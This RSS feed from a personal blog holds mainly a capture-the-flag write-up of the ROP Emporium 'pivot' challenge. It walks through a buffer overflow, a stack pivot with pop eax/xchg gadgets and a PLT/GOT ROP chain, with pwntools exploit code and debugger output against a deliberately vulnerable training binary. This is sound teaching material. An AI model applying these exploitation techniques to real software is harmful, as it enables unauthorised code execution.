<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Saurabh Mittal</title>
        <link>https://saurabhmittal16.github.io/posts/</link>
        <description>Recent content in Posts on Saurabh Mittal</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 05 Apr 2020 22:00:35 +0530</lastBuildDate>
        <atom:link href="https://saurabhmittal16.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>ROP Emporium - Pivot Writeup</title>
            <link>https://saurabhmittal16.github.io/posts/2020/04/rop-emporium-pivot-writeup/</link>
            <pubDate>Sun, 05 Apr 2020 22:00:35 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2020/04/rop-emporium-pivot-writeup/</guid>
            <description>I recently came across the ropemporium challenges while looking for resources to learn Return Oriented Programming (ROP). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the pivot challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</description>
            <content type="html"><![CDATA[

<p>I recently came across the <a href="https://ropemporium.com/" target="_blank">ropemporium</a> challenges while looking for resources to learn <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">Return Oriented Programming (ROP)</a>. I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the <a href="https://ropemporium.com/challenge/pivot.html" target="_blank">pivot</a> challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.</p>

<p>The problem description gives a basic idea of what needs to be done</p>

<blockquote>
<p>There&rsquo;s only enough space for a three-link chain on the stack but you&rsquo;ve been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.</p>
</blockquote>

<h2 id="exploring-the-binary">Exploring the binary</h2>

<p>I started by executing the binary and it expects two different inputs from the user. The print statements of binary make it clear that the second input should be used to overflow the stack and pivot it and the first input is for the main ROP chain.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pivot by ROP Emporium
32bits

Call ret2win<span style="color:#f92672">()</span> from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf7cfef10
Send your second chain now and it will land there
&gt; hello
Now kindly send your stack smash
&gt; world

Exiting</code></pre></div>
<p>The address printed by the binary is most probably the address where the longer chain is stored (heap). We can confirm this by debugging the binary with GDB.</p>

<p>Before getting into debugging the binary, I would like to state some things that I assume readers already know (if they have solved any of the previous challenges). Every binary has a <code>pwnme</code> function which uses the vulnerable <code>gets()</code> function which is used to overwrite the return pointer. The return pointer can be overwritten by 44 bytes of padding. And each binary has a function named either uselessFunction or usefulFunction which has useful assembly. This binary has a <code>uselessFunction()</code> which calls the <code>foothold_function</code>which is very important for this challenge but more on it later.</p>

<p>Now getting back to the address received from the binary. We open the binary with GDB and disassemble the <code>pwnme</code> function and set a breakpoint after the first <code>fgets</code> call (at pwnme + 114). Run the program and enter a string like <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>.
GDB breaks and the address is printed by the binary (<code>0xf7dc8f10</code> in this case). On examining this address, we find the value <code>0x414141</code> multiple times which is ASCII value of &lsquo;A&rsquo; in hexadecimal.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; x/20wx 0xf7dc8f10
0xf7dc8f10: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f20: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f30: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f40: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f50: 0x0000000a 0x00000000 0x00000000 0x00000000</code></pre></div>
<p>This confirms that the address received from binary is where the longer chain will be stored.</p>

<h2 id="pivot-the-stack">Pivot the stack</h2>

<p>The next step is to build the shorter ROP chain which pivots the stack but what does pivoting the stack mean?
In simple terms, pivoting the stack means to make the stack pointer (<code>ESP</code>) point to a memory location which we control instead of the actual stack. So, all we need to do is make <code>ESP</code> point to the address where are longer ROP chain will be saved.</p>

<p>For this, we need gadgets that can load the value from stack into any of the registers and then move the value of that register in <code>ESP</code>. The gadgets available inside a binary can be found using <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a>. On running the script on our <code>pivot32</code> binary, it found 160 unique gadgets. One of them is the <code>xchg eax, esp ; ret</code> gadget which exchanges the value of <code>EAX</code> and <code>ESP</code>. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function <code>usefulGadgets</code> which contains some useful gadgets.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass usefulGadgets
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:
   0x080488c0 &lt;+0&gt;:  pop    eax
   0x080488c1 &lt;+1&gt;:  ret
   0x080488c2 &lt;+2&gt;:  xchg   esp,eax
   0x080488c3 &lt;+3&gt;:  ret
   0x080488c4 &lt;+4&gt;:  mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
   0x080488c6 &lt;+6&gt;:  ret
   0x080488c7 &lt;+7&gt;:  add    eax,ebx
   0x080488c9 &lt;+9&gt;:  ret
   0x080488ca &lt;+10&gt;: xchg   ax,ax
   0x080488cc &lt;+12&gt;: xchg   ax,ax
   0x080488ce &lt;+14&gt;: xchg   ax,ax
End of assembler dump.</code></pre></div>
<p>Other gadget used for the pivoting is <code>pop eax ; ret</code>. This pops a value from the stack and moves it into <code>EAX</code> register. So let&rsquo;s start building the exploit script using <code>pwntools</code>. Here is a snippet of the script which loads the binary and extracts the address from the output. Some basic regex is used to extract the address.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> re

e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./pivot32&#39;</span>)
p <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>process()

recvd <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()

<span style="color:#75715e"># address where longer chain is written</span>
addr <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#39;0x[0-9a-f]{8}&#39;</span>, recvd)[<span style="color:#ae81ff">0</span>]
addr <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>)
addr <span style="color:#f92672">=</span> p32(addr)

<span style="color:#75715e"># padding for buffer overflow</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">44</span>

<span style="color:#75715e"># gadgets</span>
<span style="color:#75715e"># pop eax ; ret</span>
pop_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c0</span>)

<span style="color:#75715e"># xchg eax, esp ; ret</span>
xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)</code></pre></div>
<p>The short ROP chain is built such that after returning from <code>pwnme</code>, the <code>pop_eax</code> gadget is executed and then the exchange gadget is called.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># short chain for overflowing stack and pivoting stack to longer chain</span>
short <span style="color:#f92672">=</span> padding
short <span style="color:#f92672">+=</span> pop_eax
short <span style="color:#f92672">+=</span> addr
short <span style="color:#f92672">+=</span> xchg</code></pre></div>
<p>When <code>pop_eax</code> is executed, the top of the stack is the address where longer chain is saved, therefore it pops that value into the <code>EAX</code> register. Now <code>EAX</code> contains the address of long chain. The <code>xchg</code> gadget swaps the values and now <code>ESP</code> contains the required address. The longer chain is currently set to some junk value like <code>0xdeadbeef</code>. We can check this script by running this script and attaching GDB.</p>

<p>Breaking at <code>ret</code> of <code>pwnme</code> shows the path we are going to follow -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ► 0x804889f &lt;pwnme+173&gt;           leave
   0x80488a0 &lt;pwnme+174&gt;           ret
    ↓
   0x80488c0 &lt;usefulGadgets&gt;       pop    eax
   0x80488c1 &lt;usefulGadgets+1&gt;     ret

   0x80488c2 &lt;usefulGadgets+2&gt;     xchg   eax, esp
   0x80488c3 &lt;usefulGadgets+3&gt;     ret</code></pre></div>
<p>And after the exchange gadget is executed, <code>ESP</code> points to the address where longer chain is saved and the program tries executing the instructions saved at that address. GDB gets a segmentation fault since the address contains<code>0xdeadbeef</code> at this stage.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   0x804889f &lt;pwnme+173&gt;          leave
   0x80488a0 &lt;pwnme+174&gt;          ret
    ↓
   0x80488c0 &lt;usefulGadgets&gt;      pop    eax
   0x80488c1 &lt;usefulGadgets+1&gt;    ret

   0x80488c2 &lt;usefulGadgets+2&gt;    xchg   eax, esp
 ► 0x80488c3 &lt;usefulGadgets+3&gt;    ret    &lt;0xdeadbeef&gt;</code></pre></div>
<p>The updated registers are listed and it can be seen that <code>ESP</code> points to the desired address.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> EAX  0xfff4de88 ◂— 0xa /* <span style="color:#e6db74">&#39;\n&#39;</span> */
 EBX  0x0
 ECX  0xfff4de50 ◂— 0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
 EDX  0xf7fa189c <span style="color:#f92672">(</span>_IO_stdfile_0_lock<span style="color:#f92672">)</span> ◂— 0x0
 EDI  0x0
 ESI  0xf7fa0000 <span style="color:#f92672">(</span>_GLOBAL_OFFSET_TABLE_<span style="color:#f92672">)</span> ◂— 0x1d7d6c
 EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
 ESP  0xf7dc6f10 ◂— 0xdeadbeef
 EIP  0x80488c3 <span style="color:#f92672">(</span>usefulGadgets+3<span style="color:#f92672">)</span> ◂— ret</code></pre></div>
<p>We have successfully pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.</p>

<h2 id="getting-the-flag">Getting the flag</h2>

<h3 id="plt-and-got">PLT and GOT</h3>

<p>On reading the rest of the problem description, it is understood that we need to call the <code>ret2win</code> function dynamically imported from <code>libpivot32.so</code>. But instead of <code>ret2win</code>, another function from the same library, <code>foothold_function</code> is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in Appendix A of ropemporium&rsquo;s <a href="https://ropemporium.com/guide.html" target="_blank">beginner&rsquo;s guide</a>. I would also suggest <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank">this</a> video since it explains the working with a working example.</p>

<p>The <code>foothold_function</code> has an entry in the GOT but it needs to be populated. So, the function has to be called. We also have to find the offset between the <code>foothold_function</code> and the <code>ret2win</code> function in <code>libpivot32.so</code>. Once, the GOT entry is populated, the address of the desired function can be calculated by adding the offset to the address of <code>foothold_function</code> and calling it.</p>

<h3 id="finding-the-offset">Finding the offset</h3>

<p>I used <code>objdump</code> command to dump the source assembly of <code>libpivot32.so</code> and <code>grep</code> to find their offsets from the start of the binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S libpivot32.so | grep foothold_function
<span style="color:#ae81ff">00000770</span> &lt;foothold_function&gt;:

$ objdump -S libpivot32.so | grep ret2win
<span style="color:#ae81ff">00000967</span> &lt;ret2win&gt;:</code></pre></div>
<p>Subtracting the two values gives the offset as <code>0x1f7</code></p>

<h3 id="finding-appropriate-gadgets">Finding appropriate gadgets</h3>

<p>To add offsets into registers and load data from memory, we need gadgets. Here are the gadgets used -</p>

<ol>
<li><p><code>pop ebx ; ret</code> - This is used to load a value from the top of the stack to <code>EBX</code>.</p></li>

<li><p><code>add eax, ebx ; ret</code> - This will add the value of <code>EBX</code> and <code>EAX</code> and store it in <code>EAX</code></p></li>

<li><p><code>mov eax, dword ptr [eax] ; ret</code> - This loads the value stored at the value in <code>EAX</code>. In simple terms, it uses the value in <code>EAX</code> as an address and the value at that address is moved into <code>EAX</code></p></li>

<li><p><code>call eax</code> - This will call the address in <code>EAX</code> (should be the address of a function)</p></li>
</ol>

<h3 id="building-the-rop-chain">Building the ROP chain</h3>

<p>Before building the ROP chain, the PLT and GOT entries of <code>foothold_function</code>, the various gadgets found and the offset are stored in variables.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># dynamically imported function - foothold_function</span>
foothold_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x80485f0</span>)
foothold_got <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x804a024</span>)

<span style="color:#75715e"># gadgets</span>
<span style="color:#75715e"># pop eax ; ret</span>
pop_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c0</span>)

<span style="color:#75715e"># call eax</span>
call_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080486a3</span>)

<span style="color:#75715e"># mov eax, dword ptr [eax] ; ret</span>
eax_val <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c4</span>)

<span style="color:#75715e"># xchg eax, esp ; ret</span>
xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)

<span style="color:#75715e"># pop ebx ; ret</span>
pop_ebx <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048571</span>)

<span style="color:#75715e"># add eax, ebx ; ret</span>
add <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c7</span>)

offset <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x1f7</span>)</code></pre></div>
<p>The longer ROP chain is initialised with the PLT value of <code>foothold_function</code> since the first thing we need is to call this function to populate the GOT entry.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">=</span> foothold_plt</code></pre></div>
<p>After this, the GOT entry contains the address of <code>foothold_function</code> in the memory. The <code>libpivot32.so</code> is brought into memory when required and assigned a starting memory address. First, the address of GOT entry is moved in <code>EAX</code> and then using the <code>mov eax, dword ptr [eax] ; ret</code> gadget, the address of the imported function is moved to <code>EAX</code>(saved at the GOT entry).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_eax
long <span style="color:#f92672">+=</span> foothold_got
long <span style="color:#f92672">+=</span> eax_val</code></pre></div>
<p>The offset is moved to <code>EBX</code> and then added to <code>EAX</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_ebx
long <span style="color:#f92672">+=</span> offset
long <span style="color:#f92672">+=</span> add</code></pre></div>
<p>Now <code>EAX</code> contains the address of <code>ret2win</code> function and it can be called.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> call_eax</code></pre></div>
<p>This solves the challenge and the flag is obtained. The complete <a href="https://github.com/saurabhmittal16/ropemporium/blob/master/pivot32.py" target="_blank">script</a> can be found in my Github <a href="https://github.com/saurabhmittal16/ropemporium" target="_blank">repo</a>.</p>

<p>Here is the output when the script is executed</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 exploit.py
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
    RPATH:    b<span style="color:#e6db74">&#39;./&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32&#39;</span>: pid <span style="color:#ae81ff">28882</span>
Now kindly send your stack smash
&gt;
foothold_function<span style="color:#f92672">()</span>, check out my .got.plt entry to gain a foothold into libpivot.so
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span></code></pre></div>
<p>That&rsquo;s the end of this post. I think that this is a great challenge for beginners since the challenge is not too difficult but still interesting to work on. Thanks for reading. Cheers!</p>
]]></content>
        </item>
        
        <item>
            <title>First Post</title>
            <link>https://saurabhmittal16.github.io/posts/2020/03/first-post/</link>
            <pubDate>Sun, 08 Mar 2020 13:06:13 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2020/03/first-post/</guid>
            <description>Hello friend, welcome to my blog. I will use this blog for articles about projects I am working on or for CTF writeups of challenges</description>
            <content type="html"><![CDATA[<p>Hello friend, welcome to my blog. I will use this blog for articles about projects I am working on or for CTF writeups of challenges</p>
]]></content>
        </item>
        
    </channel>
</rss>
